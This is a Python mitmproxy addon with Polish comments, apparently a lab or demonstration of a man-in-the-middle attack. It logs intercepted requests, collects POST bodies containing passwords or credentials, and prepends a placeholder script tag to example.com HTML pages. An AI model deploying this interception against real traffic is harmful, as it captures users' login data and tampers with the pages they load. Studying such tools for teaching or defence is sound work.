import json
import os
from mitmproxy import http, ctx
from datetime import datetime

# Konfiguracja
LOG_DIR = "/app/logs"
os.makedirs(LOG_DIR, exist_ok=True)

class Interceptor:
    def __init__(self):
        self.request_count = 0
        self.captured_credentials = []
        
    def request(self, flow: http.HTTPFlow) -> None:
        self.request_count += 1
        
        # Logging żądania
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "method": flow.request.method,
            "url": flow.request.pretty_url,
            "headers": dict(flow.request.headers),
            "client_ip": flow.client_conn.address[0],
        }
        
        # Captura danych logowania
        if flow.request.method == "POST":
            try:
                content = flow.request.get_text()
                log_entry["body"] = content
                
                # Szukanie danych logowania
                if "password" in content.lower() or "credentials" in content.lower():
                    self.captured_credentials.append(log_entry)
                    ctx.log.warn(f"[!] Potencjalne dane logowania: {content[:100]}")
            except Exception as e:
                ctx.log.info(f"Error reading request body: {e}")
                pass
        
        # Zapisanie logu
        with open(f"{LOG_DIR}/requests.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")
        
        ctx.log.info(f"Request #{self.request_count}: {flow.request.pretty_url}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        # Modyfikacja odpowiedzi
        if "example.com" in flow.request.host:
            if flow.response.status_code == 200:
                if "text/html" in flow.response.headers.get("content-type", ""):
                    # Injection JavaScriptu
                    injection = """
<script>
console.log("This page has been modified by MitM");
// Malicious code could be injected here
</script>
""".encode("utf-8")
                    flow.response.content = injection + flow.response.content
                    ctx.log.warn("[!] MITM! Content was modified")
        
        # Logowanie odpowiedzi
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "url": flow.request.pretty_url,
            "status": flow.response.status_code,
            "response_size": len(flow.response.content) if flow.response.content else 0,
        }
        
        with open(f"{LOG_DIR}/responses.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")

addons = [Interceptor()]
